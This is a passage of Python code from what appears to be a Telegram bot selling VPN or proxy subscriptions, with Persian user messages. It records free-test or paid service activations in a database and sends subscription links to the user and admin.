        exp_date = (datetime.datetime.now() + datetime.timedelta(days=days, hours=hours)).strftime("%Y-%m-%d %H:%M")
        
        if action == 'test':
            today_str = datetime.datetime.now().strftime("%Y-%m-%d")
            cursor.execute("UPDATE users SET last_test_date=? WHERE user_id=?", (today_str, target_user))
            cursor.execute("INSERT INTO services (user_id, plan_days, plan_type, cf_domain, exp_date, status, purchase_date_shamsi) VALUES (?, ?, ?, ?, ?, ?, ?)",
                           (target_user, days, "اکانت تست (رایگان)", domain, exp_date, 'ACTIVE', shamsi_now))
            user_msg = f"""🎁 <b>اکانت رایگان ({days} روزه) شما فعال شد!</b>

🔗 <b>لینک سابسکریپشن هوشمند اختصاصی شما:</b>
<code>{sub_link}</code>

💡 <i>جهت دریافت بهترین اتصال، لطفاً این لینک را کپی کرده و طبق بخش آموزش‌ها در برنامه خود وارد کنید.</i>"""
        else:
            cursor.execute("INSERT INTO services (user_id, plan_days, plan_type, cf_domain, exp_date, status, purchase_date_shamsi) VALUES (?, ?, ?, ?, ?, ?, ?)",
                           (target_user, days, "Normal", domain, exp_date, 'ACTIVE', shamsi_now))
            user_msg = f"""✅ <b>سرویس اختصاصی شما با موفقیت فعال شد!</b>
📅 <b>تاریخ ثبت:</b> {shamsi_now}

🔗 <b>لینک سابسکریپشن هوشمند:</b>
<code>{sub_link}</code>

💡 <i>(لینک بالا را کپی کرده و طبق ویدیوها یا عکس‌های آموزشی داخل ربات استفاده کنید.)</i>"""
            
        conn.commit()
        try:
            bot.send_message(target_user, user_msg, parse_mode="HTML")
            success_msg = f"✅ تایید و اعمال کانفیگ موفقیت‌آمیز بود!\n🔗 `{sub_link}`\nپیام به کاربر با موفقیت ارسال شد."
        except Exception as e:
            success_msg = f"⚠️ تنظیمات روی سرور اعمال شد اما ارسال پیام به کاربر مسدود بود:\n`{sub_link}`\nError: {e}"
            
        bot.send_message(ADMIN_ID, success_msg, parse_mode="Markdown")
    else:
        bot.send_message(ADMIN_ID, "❌ خطا در ارتباط با ورکر! آدرس و توکن رو چک کنید.")
    
    user_states.pop(ADMIN_ID, None)

if __name__ == '__main__':
    print("Bot started and ready to serve!")
    bot.infinity_polling()
